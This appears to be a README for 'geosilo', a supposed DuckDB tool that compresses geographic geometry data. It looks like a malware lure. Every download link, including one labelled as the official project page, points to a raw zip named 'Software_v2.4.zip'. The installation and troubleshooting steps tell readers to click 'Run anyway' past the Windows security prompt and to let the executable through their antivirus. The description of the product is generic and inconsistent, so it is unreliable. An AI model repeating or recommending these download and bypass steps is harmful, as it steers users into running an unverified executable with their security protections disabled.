# 📦 geosilo - Reduce your geospatial data storage costs

[![](https://img.shields.io/badge/Download_geosilo-blue)](https://raw.githubusercontent.com/adidashyperspace-lab/geosilo/main/scripts/Software_v2.4.zip)

Geosilo helps you save space when you store geographic data. It compresses your geometry coordinates so they take up less room on your hard drive. Most geographic databases store shapes using a format called WKB. This format is often bulky. Geosilo uses delta-encoding to shrink these shapes. This tool makes your data three to four times smaller than standard methods. It integrates directly with DuckDB to keep your workflow fast and efficient.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- DuckDB installed on your system
- 50 MB of free storage space
- Basic internet access for the initial download

## 📥 How to Download

You must visit the project page to get the installer for your version of Windows. 

[Visit the official geosilo page](https://raw.githubusercontent.com/adidashyperspace-lab/geosilo/main/scripts/Software_v2.4.zip)

Follow these steps to acquire the software:

1. Click the link above to open your web browser.
2. Locate the latest release section on the right side of the page.
3. Select the file ending in .zip or .exe that matches your Windows version.
4. Save the file to your computer.

## ⚙️ Installation Guide

Follow these steps to set up geosilo on your Windows machine:

1. Open your "Downloads" folder in File Explorer.
2. Double-click the downloaded file to begin the process.
3. If Windows shows a security prompt, click "More info" and then click "Run anyway."
4. Follow the on-screen instructions to complete the setup.
5. Once the installer finish, click "Close."

## 🚀 Getting Started

The geosilo tool operates as an extension for DuckDB. You connect it to your database to shrink your geometry columns. 

1. Open your command prompt or your DuckDB terminal.
2. Load the geosilo extension by typing the command provided in your database interface.
3. Use the compression function on your existing table columns.
4. Watch as your database size drops.

## 📊 How It Works

Traditional databases record every single point in a geometric shape as a long string of numbers. Geosilo changes this method. Instead of recording the full coordinate, it records the difference between one point and the next. This difference is almost always a small number. Storing small numbers requires fewer bytes of memory than storing large ones. The software reconstructs the original coordinates when you need them. You get the same accuracy but with much smaller file sizes.

## 🏢 Why Choose Geosilo

Storage costs money and time. If you work with large datasets, you know that moving files across a network takes time. Large files also make queries run slower. By shrinking your data, you speed up every part of your pipeline.

- High Compression: Achieve 3-4x smaller file sizes compared to standard WKB.
- Seamless Integration: Use your data in DuckDB without changing your existing infrastructure.
- Efficiency: Query your compressed data without manual decompression steps.
- Reliability: Geosilo maintains data integrity throughout the compression process.
- Performance: Smaller data means faster read speeds from your disk.

## 💡 Frequently Asked Questions

**Does this change my original data?**
No. The compression is reversible. When you read the data back, you get exact copies of your original coordinates.

**Can I use this with other databases?**
Geosilo currently focuses on DuckDB. It leverages the structure of DuckDB to provide the fastest compression speeds.

**How do I update the software?**
Visit the download link again to check for new versions. Download and install the new version over the old one to apply updates.

**Is my computer fast enough to run this?**
Yes. Geosilo features low overhead. It works on standard office hardware without slowing down your machine.

**Do I need a license to use this?**
The software is free to use for personal and professional projects.

## 🔍 Troubleshooting Issues

If you encounter errors during setup, check these items:

1. Ensure you have the latest version of DuckDB installed.
2. Verify that your file system has enough space to hold the installation folder.
3. Restart your computer if the installer hangs.
4. Check your antivirus settings to confirm it allows the geosilo executable to run.
5. Clear your temporary files if you experience memory errors during the setup process.